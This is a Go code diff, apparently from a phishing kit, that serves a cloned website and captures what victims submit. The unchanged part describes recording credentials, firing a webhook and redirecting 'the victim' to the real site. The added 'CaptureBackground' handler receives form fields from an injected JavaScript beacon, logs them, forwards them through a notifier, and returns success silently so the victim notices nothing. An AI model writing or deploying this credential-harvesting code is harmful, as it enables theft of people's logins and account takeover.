@@ -33,7 +33,7 @@ func (h *handlers) ServeClone(w http.ResponseWriter, r *http.Request) {
 	http.ServeFile(w, r, filepath.Join(h.cloneDir, "index.html"))
 }
 
-// CaptureCredentials handles POST /submit — records fields, fires webhook,
+// CaptureCredentials handles /submit — records fields, fires webhook,
 // then redirects the victim to the real site.
 func (h *handlers) CaptureCredentials(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost && r.Method != http.MethodGet {
@@ -57,4 +57,31 @@ func (h *handlers) CaptureCredentials(w http.ResponseWriter, r *http.Request) {
 	}
 
 	http.Redirect(w, r, h.redirectURL, http.StatusFound)
+}
+
+// CaptureBackground handles POST /capture — called by the injected JS beacon.
+// Logs fields and returns 200 so page flow is not interrupted.
+func (h *handlers) CaptureBackground(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if err := r.ParseForm(); err != nil {
+		w.WriteHeader(http.StatusOK)
+		return
+	}
+
+	fields := make(map[string]string, len(r.Form))
+	for k, v := range r.Form {
+		fields[k] = strings.Join(v, ", ")
+	}
+
+	if len(fields) > 0 {
+		h.log.LogCapture(r, fields)
+		if h.notifier != nil {
+			go h.notifier.Send(context.Background(), fields)
+		}
+	}
+
+	w.WriteHeader(http.StatusOK)
 }
